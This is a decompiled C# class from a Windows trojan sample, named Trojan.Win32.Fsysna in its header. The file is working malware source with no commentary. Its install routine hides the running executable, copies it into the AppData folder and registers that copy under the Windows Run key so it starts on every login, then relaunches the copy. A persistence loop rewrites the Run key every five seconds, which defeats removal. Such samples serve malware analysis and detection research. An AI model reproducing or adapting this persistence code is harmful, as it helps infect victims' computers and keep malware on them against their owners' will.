// Decompiled with JetBrains decompiler
// Type: Stub.c_Startup
// Assembly: Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 85CBEE6D-9173-48CF-9DE2-C5D6EFA84893
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.dosu-c8b1b84f43bfbe7a69a68cc22f61d7b748661a1fe24c157f43f282f251b83c42.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
  internal class c_Startup
  {
    public static bool b_Install()
    {
      if (c_Config.i_Startup == 0)
        return true;
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string volumeSerial = c_Misc.GetVolumeSerial(c_Misc.GetSystemDrive());
      string str2 = c_Config.i_InstallType != 0 ? str1 + volumeSerial + ".exe" : str1 + c_Config.s_DropName;
      if (Application.ExecutablePath == str2)
        return true;
      if (File.Exists(str2))
      {
        try
        {
          File.Delete(str2);
        }
        catch
        {
        }
      }
      if (File.Exists(str2))
        return false;
      File.SetAttributes(Application.ExecutablePath, File.GetAttributes(Application.ExecutablePath) | FileAttributes.Hidden);
      File.Copy(Application.ExecutablePath, str2);
      File.SetAttributes(str2, File.GetAttributes(str2) | FileAttributes.Hidden);
      RegistryKey registryKey = c_Misc.GetOS().Contains("Windows Vista") || c_Misc.GetOS().Contains("Windows 7") || c_Misc.GetOS().Contains("Windows 8") ? Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true) : Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
      string name = c_Config.i_InstallType != 0 ? volumeSerial : c_Config.s_InstallName;
      registryKey.SetValue(name, (object) str2);
      registryKey.Close();
      Process.Start(str2);
      Environment.Exit(0);
      return true;
    }

    public static bool b_Uninstall()
    {
      if (c_Config.i_Startup == 0)
        return true;
      string name = c_Config.i_InstallType != 0 ? c_Misc.GetVolumeSerial(c_Misc.GetSystemDrive()) : c_Config.s_InstallName;
      if (c_Config.i_Persistance == 1)
        c_Main.persistanceThread.Abort();
      RegistryKey registryKey = c_Misc.GetOS().Contains("Windows Vista") || c_Misc.GetOS().Contains("Windows 7") || c_Misc.GetOS().Contains("Windows 8") ? Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true) : Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
      registryKey.DeleteValue(name);
      registryKey.Close();
      return true;
    }

    public static void Persistance()
    {
      if (c_Config.i_Persistance == 0 || c_Config.i_Startup == 0)
        return;
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string volumeSerial = c_Misc.GetVolumeSerial(c_Misc.GetSystemDrive());
      string str2 = c_Config.i_InstallType != 0 ? str1 + volumeSerial + ".exe" : str1 + c_Config.s_DropName;
      RegistryKey registryKey = c_Misc.GetOS().Contains("Windows Vista") || c_Misc.GetOS().Contains("Windows 7") || c_Misc.GetOS().Contains("Windows 8") ? Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true) : Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
      string name = c_Config.i_InstallType != 0 ? volumeSerial : c_Config.s_InstallName;
      registryKey.SetValue(name, (object) str2);
      registryKey.Close();
      Thread.Sleep(5000);
      c_Startup.Persistance();
    }
  }
}
